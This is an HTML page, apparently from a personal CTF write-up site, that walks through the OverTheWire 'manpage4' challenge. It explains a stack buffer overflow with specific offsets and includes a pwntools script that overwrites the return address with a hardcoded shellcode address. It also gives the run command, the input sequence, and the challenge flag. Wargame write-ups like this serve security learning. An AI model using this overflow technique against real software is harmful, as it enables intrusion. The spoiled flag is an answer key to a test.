@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>manpage4 | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="manpage4" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/CTF_writeups/overthewire/manpage/manpage4.html" />
+<meta property="og:url" content="http://localhost:4000/CTF_writeups/overthewire/manpage/manpage4.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="manpage4" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"manpage4","url":"http://localhost:4000/CTF_writeups/overthewire/manpage/manpage4.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/CTF_writeups/">
+          <h1>Avishai's CTF Writeups</h1>
+        </a>
+        <h2>...</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <p>In this challenge we exploit the fact we can put input into <code class="language-plaintext highlighter-rouge">inp</code> on the stack, which is 2048, and then there will be content on <code class="language-plaintext highlighter-rouge">lastname</code>.
+When we will manage to win the game, we can insert new-line into the first name, and then lastname will contain garbage values, and there will be no problem when it’ll copy it to <code class="language-plaintext highlighter-rouge">buf</code>.</p>
+
+<p>However, the stack isn’t empty… because, we filled it before with our content.</p>
+
+<p>This is the address of <code class="language-plaintext highlighter-rouge">inp</code>: 0xffffcb34 and this is of <code class="language-plaintext highlighter-rouge">lastname</code>: 0xffffd038.
+The diff between them is 1284, and then we need to find how many characters we need to put in <code class="language-plaintext highlighter-rouge">lastname</code> until it override the ret-address, in this case we can find it’s 208 bytes.</p>
+
+<p>So, all left is to solve the game.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">shellcode_address</span> <span class="o">=</span> <span class="mh">0xffffd548</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">x</span> <span class="o">=</span> <span class="nb">input</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">upper</span><span class="p">().</span><span class="n">startswith</span><span class="p">(</span><span class="s">"ATTACK"</span><span class="p">):</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">1284</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'B'</span><span class="o">*</span><span class="mi">208</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">shellcode_address</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+
+</code></pre></div></div>
+<p>pipe all the data as it was a regular stdin, and when you want to make the attack, you only need to type ATTACK.</p>
+
+<p>I use random 4, and find that in room 10 the WUMPUS is found.</p>
+
+<ul>
+  <li>execute
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./level4.py | /manpage/manpage4 -s 4
+</code></pre></div>    </div>
+  </li>
+  <li>input <code class="language-plaintext highlighter-rouge">N</code> new line, <code class="language-plaintext highlighter-rouge">ATTACK</code> new line, <code class="language-plaintext highlighter-rouge">S</code> new line, <code class="language-plaintext highlighter-rouge">1</code> new line, <code class="language-plaintext highlighter-rouge">10</code> new line, <code class="language-plaintext highlighter-rouge">\n</code>.</li>
+</ul>
+
+<p><img src="/CTF_writeups/overthewire/manpage/images/level4.png" alt="image" /></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">sxmrfDKUtV</code></em></strong></p>
+
+      </section>
+    </div>
+  </body>
+</html>
